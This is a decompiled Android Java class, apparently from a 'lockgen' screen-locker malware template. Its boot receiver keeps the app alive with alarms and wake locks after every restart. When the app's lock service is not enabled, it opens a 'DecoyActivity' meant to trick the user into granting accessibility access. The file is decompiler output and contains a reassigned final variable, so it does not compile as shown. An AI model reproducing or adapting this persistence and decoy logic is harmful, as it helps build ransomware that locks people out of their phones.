package com.lockgen.template.app.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "TplBoot";

    @Override // android.content.BroadcastReceiver
    public void onReceive(final Context context, Intent intent) {
        final PowerManager.WakeLock wakeLock = null;
        String action = intent == null ? null : intent.getAction();
        if (action == null) {
            return;
        }
        boolean equals = KeepAlive.ACTION_TICK.equals(action);
        boolean z = "android.intent.action.BOOT_COMPLETED".equals(action) || "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action) || "android.intent.action.REBOOT".equals(action) || action.endsWith("QUICKBOOT_POWERON");
        try {
            KeepAlive.schedule(context, lockActive(context) ? Cfg.i(Cfg.obj(Cfg.get(context), "guard"), "alarmSec", 300) : 300);
        } catch (Throwable unused) {
        }
        PowerManager powerManager = (PowerManager) context.getSystemService("power");
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(equals ? 1 : 268435457, "tpl:boot");
            wakeLock.acquire(15000L);
        }
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: com.lockgen.template.app.core.BootReceiver$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                BootReceiver.lambda$onReceive$0(context, wakeLock);
            }
        }, z ? 800L : 200L);
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void lambda$onReceive$0(Context context, PowerManager.WakeLock wakeLock) {
        try {
            if (!serviceEnabled(context)) {
                Intent intent = new Intent(context, Class.forName(context.getPackageName() + ".ui.DecoyActivity"));
                intent.addFlags(268435456);
                context.startActivity(intent);
            }
        } catch (Throwable th) {
            try {
                Log.w(TAG, "拉起引导页失败", th);
                if (wakeLock == null || !wakeLock.isHeld()) {
                    return;
                }
                wakeLock.release();
            } finally {
                if (wakeLock != null && wakeLock.isHeld()) {
                    wakeLock.release();
                }
            }
        }
    }

    public static boolean lockActive(Context context) {
        return context.getSharedPreferences("sp", 0).getBoolean("lock_active", false);
    }

    public static boolean serviceEnabled(Context context) {
        String string;
        if (Settings.Secure.getInt(context.getContentResolver(), "accessibility_enabled") == 1 && (string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services")) != null) {
            String str = context.getPackageName() + "/" + context.getPackageName() + ".core.LockService";
            TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
            simpleStringSplitter.setString(string);
            while (simpleStringSplitter.hasNext()) {
                if (simpleStringSplitter.next().equalsIgnoreCase(str)) {
                    return true;
                }
            }
            return false;
        }
        return false;
    }
}